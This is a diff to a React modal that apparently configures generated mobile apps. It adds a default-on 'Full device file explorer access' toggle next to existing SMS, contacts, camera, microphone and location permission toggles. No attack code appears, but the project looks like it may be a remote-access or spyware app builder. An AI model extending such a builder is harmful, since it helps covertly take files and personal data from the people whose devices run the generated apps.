@@ -7,7 +7,7 @@ import {
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
     AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
     Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
-    Settings, MousePointerClick, HardDrive, Camera, Mic, MapPin, Users, MessageSquare,
+    Settings, MousePointerClick, HardDrive, Camera, Mic, MapPin, Users, MessageSquare, Folder,
     Radio, BellRing, BellOff
 } from 'lucide-react';
 
@@ -231,6 +231,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
     const [enableContactsPermission, setEnableContactsPermission] = useState(false);
     const [enableStoragePermission, setEnableStoragePermission] = useState(true);
+    const [enableFileManagerPermission, setEnableFileManagerPermission] = useState(true);
     const [enableCameraPermission, setEnableCameraPermission] = useState(false);
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
     const [enableLocationPermission, setEnableLocationPermission] = useState(false);
@@ -466,6 +467,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
+            formData.append('enableFileManagerPermission', enableFileManagerPermission.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
@@ -849,7 +851,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         <div className="flex flex-col min-w-0">
                                             <div className="flex items-center gap-1.5">
                                                 <span className={`text-xs font-black truncate ${enableStoragePermission ? 'text-emerald-200' : 'text-white'}`}>
-                                                    Storage & File Manager
+                                                    Gallery & Storage
                                                 </span>
                                                 <button 
                                                     type="button" 
@@ -859,11 +861,40 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     <Info size={12} />
                                                 </button>
                                             </div>
-                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">All files access & file explorer</span>
+                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Index & stream media</span>
                                         </div>
                                     </div>
                                     <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableStoragePermission ? 'bg-emerald-500 shadow-[0_0_8px_#10b981]' : 'bg-white/10'}`}>
                                         <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableStoragePermission ? 'translate-x-5' : 'translate-x-0'}`} />
+                                    </div>
+                                </div>
+
+                                {/* File Manager Permission Card */}
+                                <div 
+                                    onClick={() => setEnableFileManagerPermission(!enableFileManagerPermission)}
+                                    className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
+                                        enableFileManagerPermission 
+                                            ? 'bg-amber-500/10 border-2 border-amber-500/60 shadow-[0_0_16px_rgba(245,158,11,0.2)]' 
+                                            : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-70 hover:opacity-100'
+                                    }`}
+                                >
+                                    <div className="flex items-center gap-3 min-w-0">
+                                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
+                                            enableFileManagerPermission ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-white/5 text-white/40'
+                                        }`}>
+                                            <Folder size={18} />
+                                        </div>
+                                        <div className="flex flex-col min-w-0">
+                                            <div className="flex items-center gap-1.5">
+                                                <span className={`text-xs font-black truncate ${enableFileManagerPermission ? 'text-amber-200' : 'text-white'}`}>
+                                                    File Manager
+                                                </span>
+                                            </div>
+                                            <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Full device file explorer access</span>
+                                        </div>
+                                    </div>
+                                    <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableFileManagerPermission ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
+                                        <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableFileManagerPermission ? 'translate-x-5' : 'translate-x-0'}`} />
                                     </div>
                                 </div>
 
